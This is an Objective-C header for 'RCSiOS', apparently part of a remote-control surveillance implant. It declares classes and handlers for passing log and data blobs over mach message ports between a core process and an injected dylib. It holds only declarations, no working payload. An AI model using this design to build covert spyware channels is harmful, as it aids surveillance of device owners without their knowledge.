/*
 * RCSiOS - IPC through machport
 *  since shmget = ENOSYS
 *
 *
 * Created on 11/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 * Adapted from RCSMac by Massimo Chiodini on 05/03/2010
 *
 */

#import <Foundation/Foundation.h>

#import "RCSIDylibBlob.h"

#define kRCS_SUCCESS 0
#define kRCS_ERROR   1

#ifndef __RCSISharedMemory_h__
#define __RCSISharedMemory_h__

CFDataRef coreMessagesHandler(CFMessagePortRef local,
                              SInt32 msgid,
                              CFDataRef data,
                              void *info);

CFDataRef dylibMessagesHandler(CFMessagePortRef local,
                               SInt32 msgid,
                               CFDataRef data,
                               void *info);


@interface _i_SharedMemory : NSObject
{
@private
  NSString            *mFilename;
  char                *mSharedMemory;
  CFMessagePortRef    mMemPort;
  NSMutableArray      *mLogMessageQueue;
  NSMutableArray      *mRemotePorts;
  int mFD;
  int mKey;
  int qID;
  
  // new attr
  CFMessagePortRef    mCorePort;
  CFMessagePortRef    mDylibPort;
  NSMutableArray      *mCoreRemotePorts;
  CFRunLoopSourceRef  mRLSource;
  NSMutableArray      *mCoreMessageQueue;
  NSMutableArray      *mDylibBlobQueue;
  uint                mDylibBlobCount;
}

@property (readwrite) char          *mSharedMemory;
@property (readonly)  NSString      *mFilename;
@property (readonly) NSMutableArray *mCoreMessageQueue;
@property (readonly) NSMutableArray *mLogMessageQueue;


+ (_i_SharedMemory *)sharedInstance;
+ (BOOL)sendMessageToCoreMachPort:(NSData*)aData;
+ (BOOL)sendMessageToMachPort:(mach_port_t)port 
                     withData:(NSData *)aData;
 
- (int)createDylibRLSource;
- (int)removeDylibRLSource;
- (void)addPort: (CFMessagePortRef)port;
- (void)putBlob:(_i_DylibBlob*)aBlob;
- (id)getBlob;
- (id)getBlobs;
- (void)delBlobs;
- (BOOL)syncDylibLocalPort;

- (int)createCoreRLSource;
- (NSMutableArray*)fetchMessages;

- (BOOL)writeAllIpcBlobsToPort:(CFMessagePortRef)aPort;
- (BOOL)writeIpcBlob:(NSData*)aData;
- (void)refreshRemoteBlobsToPid:(int)aPid;

- (void)synchronizeRemotePort:(CFMessagePortRef)port
                    withMsgId:(SInt32)aMsgId
                      andData:(NSData *)aData;
- (BOOL)synchronizeRemotePorts:(NSData *)data;

@end

#endif